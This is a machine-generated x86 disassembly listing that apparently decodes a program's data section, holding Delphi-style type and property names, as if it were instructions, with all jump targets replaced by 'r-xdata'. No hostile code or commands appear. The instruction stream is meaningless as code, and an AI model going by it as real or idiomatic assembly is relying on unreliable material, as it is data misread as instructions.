xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xfa
inc edx
add [ eax ] al
mov al 0xfa
inc edx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
adc [ eax + eax + 0x78 ] eax
cmp al [ ebx ]
test [ ecx ] dl
inc esp
add [ eax - 0xfffbbef ] bl
cmp eax [ ebx ]
lodsb [ esi ]
cmp al [ ebx ]
aam 0x11
inc esp
add al ch
adc [ eax + eax - 0x1c ] eax
cmp al [ ebx ]
adc [ edx ] dl
inc esp
add [ eax + 0x3b ] al
inc ebx
add [ eax ] bl
adc al [ eax + eax + 0x60 ]
cmp eax [ ebx ]
and [ edx ] dl
inc esp
add [ esp + edi + 0x43 ] dh
add [ esp + edi + 0x43 ] dl
add [ esp + edi + 0x3b800043 ] dl
inc ebx
add [ edx + edx ] dh
inc esp
add [ eax ] bh
adc al [ eax + eax - 0x5c ]
cmp eax [ ebx ]
adc al 0x39
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah cl
0x38f80041 0x43
add [ ebx + 0x3b180041 ] bl
inc ebx
add [ ebx + ebx * 4 ] dh
inc ecx
add ah al
cmp eax [ ebx ]
test [ edx - 0x64e7ffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x41 ] ch
inc ecx
add [ eax ] bl
cmp eax [ ebx ]
xor al 0x9b
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42fbb890
add [ ebx ] al
or al 0x54
int3
jae r-xdata
add [ esp + edi * 8 + 0x42 ] bh
outsd
insd
popad
je r-xdata
inc edx
inc edx
jne r-xdata
add [ eax ] al
add [ eax + 0x42fa ] dh
cli
inc edx
add [ eax + 0x40041b0 ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ edi * 8 + 0x8060042 ] ah
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
add [ edx + edi ] al
inc ebx
add [ ecx + edx + 0x44 ] bl
add [ eax + 0x3a ] bh
inc ebx
add [ ecx + edx + 0x11980044 ] al
inc esp
add al dh
inc ecx
outsd
insb
jae r-xdata
cmp [ ebx ] al
pushad
aas
add eax ebx
cld
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
cld
inc edx
add [ ebx ] cl
jae r-xdata
mov ah 0xfc
inc edx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + edi * 8 + 0x6d060042 ] dh
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ ebp - 0x4dbffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c0042fb ] ah
add [ eax ] al
add [ edx + ecx + 0x44 ] dh
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
cld
inc edx
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
shl [ esp + edi * 8 ] 0x42
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
pop eax
cmp [ ebx ] al
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x42fd3474
add [ eax + eax ] dl
add bh bh
pop eax
cmp [ ebx ] al
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x8800408d
inc [ edx ]
or [ ebx ] cl
push esp
dec ebp
outsd
js r-xdata
pop eax
cmp [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ esi + edi + 0x41 ] dh
add ah ah
cmp [ ebx ] al
aam 0x37
add [ eax + 0x3f ] ah
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
popad
jb r-xdata
jb r-xdata
jb r-xdata
int3
lea eax [ eax ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax ] dl
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
outsd
insb
inc edx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
outsb
je r-xdata
outsd
sti
inc edx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x42ff00c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xfcdcc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
cmp ah 0x42
add [ ebx ] al
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc ebx
add ah dl
aaa
add eax 0x0
inc edx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc edx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
fdiv st4
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add al bl
cld
inc edx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
add [ ecx ] al
add [ eax ] al
add ah dh
sti
inc edx
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x30042fc ] al
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
cld
inc edx
add [ eax ] al
adc [ eax ] al
nop
je r-xdata
outsb
je r-xdata
push 0x48004010
cmovno eax [ eax ]
nop
mov al 0xff
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
hlt
add al dl
test [ edx ] 0x1c
add [ ebx ] eax
or [ 0x646e4554 ] cl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
inc esp
jb r-xdata
inc edx
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp - 0x13ffc0 ] cl
inc edx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0xd40040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x1 ] bh
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
shl dh 0x1
inc edx
add [ ecx + eax ] bl
inc ebx
add [ eax ] cl
or eax 0x646e4554
push ebx
outsb
add al 0x8
push es
hlt
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc [ eax ] al
jo r-xdata
add ah dh
inc edx
add [ eax ] ch
add eax [ ebx ]
or [ ecx ] dl
push esp
inc edi
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
hlt
outsb
je r-xdata
inc ebx
jpe r-xdata
enter 0x4308 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4303b4c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
enter 0x4308 0x0
adc [ eax ] dl
inc ebx
add [ eax ] al
adc [ eax ] al
fadd [ edx ]
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43053cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4304b4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add ah dh
adc [ eax ] al
jo r-xdata
inc edx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
cld
inc edx
add [ eax ] al
adc [ eax ] al
nop
jo r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc ebx
add [ eax ] cl
or al 0x54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp al 0x5
inc ebx
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
test [ ecx ] ah
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
and al 0x4
inc ebx
add [ eax ] cl
add al ah
cdq
jo r-xdata
add [ ecx - 0x661fffbf ] al
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push es
inc ebx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x6540040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
dec eax
cmovno eax [ eax ]
cmp al 0x10
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push es
inc ebx
add ah cl
or [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cli
lea eax [ eax ]
push esp
push es
jbe r-xdata
add [ esi + 0x5c004308 ] bh
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
dec eax
cmovno eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x8004305 ] dh
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ebp + edi + 0x6c9c0043 ] cl
inc ebx
add [ eax + 0x3e740043 ] dl
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x3ff00043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x3cb40041 0x43
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_42fd65
std
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x200042 ] dh
add [ eax ] al
pushad
push ss
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
lea eax [ eax ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax ] dl
cmp [ ebx ] al
pushad
aas
inc ecx
add [ esi + edi + 0x41 ] dh
add ah ah
cmp [ ebx ] al
aam 0x37
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
int3
popad
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
pop eax
cmp [ ebx ] al
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x42fd3474
add [ eax + eax ] dl
add bh bh
pop eax
cmp [ ebx ] al
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x8800408d
inc [ edx ]
or [ ebx ] cl
push esp
dec ebp
outsd
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x42ff00c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
